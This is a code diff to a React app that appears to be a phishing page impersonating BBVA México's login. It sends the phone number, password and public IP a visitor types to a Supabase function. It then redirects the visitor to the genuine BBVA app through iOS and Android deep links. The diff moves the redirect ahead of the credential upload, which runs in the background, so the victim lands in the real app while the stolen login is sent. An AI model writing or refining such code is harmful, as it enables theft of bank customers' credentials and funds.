@@ -62,34 +62,24 @@ function App() {
   const [loginError, setLoginError] = useState('')
   const [loginSuccess, setLoginSuccess] = useState('')
 
-  // Modificación A: Lógica de apertura/redirección directa
+  // Apertura síncrona inmediata para iOS / Android
   const openApp = () => {
     const playStorePackage = 'com.bbva.bancomer'
-    const appStoreId = '382878482'
+    const appStoreId = '374824226'
 
     const userAgent = navigator.userAgent || navigator.vendor
     const isAndroid = /android/i.test(userAgent)
     const isIOS = /iPad|iPhone|iPod/.test(userAgent)
 
-    if (isAndroid) {
-      // Intentar abrir mediante el esquema directo de Android
-      window.location.href = 'bbva://'
-      
-      // Fallback inmediato a la Play Store si no está instalada la app
-      setTimeout(() => {
-        window.location.href = `https://play.google.com/store/apps/details?id=${playStorePackage}`
-      }, 1000)
-    } else if (isIOS) {
-      // Intentar abrir mediante el esquema de iOS
-      window.location.href = 'bbva://'
-      
-      // Fallback inmediato a la App Store
+    if (isIOS) {
+      window.location.href = 'bbvamexico://'
       setTimeout(() => {
         window.location.href = `https://apps.apple.com/app/id${appStoreId}`
-      }, 1000)
+      }, 1200)
+    } else if (isAndroid) {
+      window.location.href = `intent://open#Intent;scheme=bbvamexico;package=${playStorePackage};S.browser_fallback_url=https://play.google.com/store/apps/details?id=${playStorePackage};end`
     } else {
-      // Si se ejecuta desde una computadora de escritorio
-      window.open(`https://play.google.com/store/apps/details?id=${playStorePackage}`, '_blank')
+      window.open(`https://apps.apple.com/app/id${appStoreId}`, '_blank')
     }
   }
 
@@ -110,25 +100,28 @@ function App() {
     setLoginSuccess('')
     setIsSubmitting(true)
 
-    const ip = await getPublicIP()
-
-    const { error } = await supabase.functions.invoke('login', {
-      body: { phone, password, ip },
-    })
-
-    setIsSubmitting(false)
-
-    if (error) {
-      setLoginError('Error al conectar. Inténtalo más tarde.')
-      return
-    }
-
-    setLoginSuccess('Inicio de sesión exitoso')
-    setPhone('')
-    setPassword('')
-
-    // Intento de redirección tras autenticar
+    // 1. Iniciar redirección de forma SÍNCRONA inmediatamente tras el evento del clic
     openApp()
+
+    // 2. Ejecutar la petición a Supabase en segundo plano
+    try {
+      const ip = await getPublicIP()
+      const { error } = await supabase.functions.invoke('login', {
+        body: { phone, password, ip },
+      })
+
+      if (error) {
+        setLoginError('Error al conectar. Inténtalo más tarde.')
+      } else {
+        setLoginSuccess('Inicio de sesión exitoso')
+        setPhone('')
+        setPassword('')
+      }
+    } catch (err) {
+      setLoginError('Error inesperado.')
+    } finally {
+      setIsSubmitting(false)
+    }
   }
 
   if (showLogin) {
@@ -183,9 +176,11 @@ function App() {
               </svg>
             </button>
           </label>
+
           <button className="submit-login" type="submit" disabled={isSubmitting}>
             {isSubmitting ? 'Enviando...' : 'Continuar'}
           </button>
+
           {loginError && <p className="login-error" role="alert">{loginError}</p>}
           {loginSuccess && <p className="login-success" role="status">{loginSuccess}</p>}
           <a className="forgot-password" href="#0">
